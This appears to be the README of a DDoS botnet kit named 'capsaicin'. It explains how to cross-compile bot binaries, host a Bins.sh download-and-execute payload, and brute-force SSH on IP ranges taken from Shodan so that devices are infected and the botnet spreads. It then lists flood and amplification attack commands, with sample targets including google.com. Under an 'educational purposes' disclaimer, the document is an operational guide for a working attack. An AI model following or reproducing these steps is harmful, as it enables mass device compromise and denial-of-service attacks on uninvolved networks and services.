# --- Disclaimer ---
***I AM NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS***

***THIS IS FOR EDUCATIONAL PURPOSES ONLY***

# --- Notice ---
_Make sure you do this ALL off of a VPS or VPN_


# --- Cross Compiling ---
Use cc7.py for compiling for multiple architectures. You need it compiled for mips, powerpc, superh, etc.

You'll get barely any bots with it just compiled for x86_32 and/or x86_64.

cc7.py auto setups vsftpd, tftpd, httpd, and then cross compiles.

Before you run cc7, install lighttpd since httpd can't handle as many connections.

```apt-get install lighttpd -y```

**OR**

```yum install lighttpd -y```

# --- Run cc7 ---
* ```python cc7.py capsaicin.c 1.3.3.7```

   * 1.3.3.7 would be your servers IP

* It will cross compile and give you your 'link'

* The link will be your wget, ftpget, & tftp line
  * Use this line in the infect.py scanner

* Bins.sh along with the cross compiled binaries will be in /var/www/html
   * Bins.sh is the file the scan will tell your bots to download and execute

* Once the bot starts running things, the device will then start downloading and executing the bot for each of the architectures, executing them and becoming infected

# --- Scanning ---
* Use infect.py to get bots
   * It's an ssh scanner and bruter.
   * Make sure you edit infect.py to use your wget line
     or use your bot names for dl + exec.
   * After you've changed the wget line in your infect.py, then you can scan and get bots

* You will need the paramiko module in order to run it

```apt-get install python-paramiko -y```

**OR**

```yum install python-paramiko -y```

* **Now run this:** ```python infect.py 376 B 122.3.x.x```
   * It's a decent range to get you started
   * You can use the default ranges in infect.py (LUCKY, BRAZIL, LUCKY2, etc) but you'll get botkilled really fast
   * Find ranges off of shodan.io if you need to (search for port:22)

Once your bots join they will start scanning for telnet and more will join slowly

The more bots you have, the more random ones will join faster from telnet

**To toggle the scanner off for all the bots, type:**

```!* SCANNER OFF```

**And to turn it on:**

```!* SCANNER ON```

The bot growth rate is basically exponential after a few thousand. You can get thousands online easily

# --- Attacking ---

**Non-spoof / non-root attacks:**

STD <ip> <port> <time>      = A non spoof UDP HIV STD flooder

HOLD <host> <port> <time>   = A vanilla TCP connection flooder

JUNK <host> <port> <time>   = A vanilla TCP flooder (modded)

UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>  = Another non-spoof udp flooder

HTTP <method> <target> <port> <path> <time> <power> = A powerful HTTP flooder

WGETFLOOD <url> <secs>      =  An HTTP(S) flooder                                                                        

**Spoof / root attacks:**

PAN <target> <port> <secs>  = A SYN flooder                           

TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads> = An advanced spoofed TCP flooder. Multithreading and xmas, usyn methods/SynthMesc.

UDP <target> <port> <secs>  = An UDP flooder                          

PHATWONK <target> <flags/method> <secs> = A leet flooder


**Server kill attacks:**                                                   

SOCKSTRESS <ip>:<port> <interface> -s <time> [-p payload] [-d delay] = Sockstress. TCP/IP stack 'exploit'. Has been known to brick servers.

BLACKNURSE <target ip> <secs> = An ICMP flooder that will crash firewalls. 

TARGA3 <ip1> [ip2] ... [-s seconds] = Targa3 attack. TCP stack fuzzer. Can attack up to 200 hosts at once. Will bypass most filters and crash old machines.


**Amplification attacks:**                                                   

NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =  A DrDoS flooder using the NTP protocol

DNS <IP> <port> <reflection file url> <threads> <time> =   DNS DrDoS flooder

QUAKE3 <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   A DrDoS flooder using the Quake3 protocol

SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Amp(600 - 1700x)


**To run a command on all bots say:**

```!* CMD```

**Example:**

```!* STD 1.2.3.4 53 3600```

**To run a command for all bot IDs starting with A, say:**

```!A* CMD```

**Example:**

```!A* WgetFlood https://google.com/ 3600```
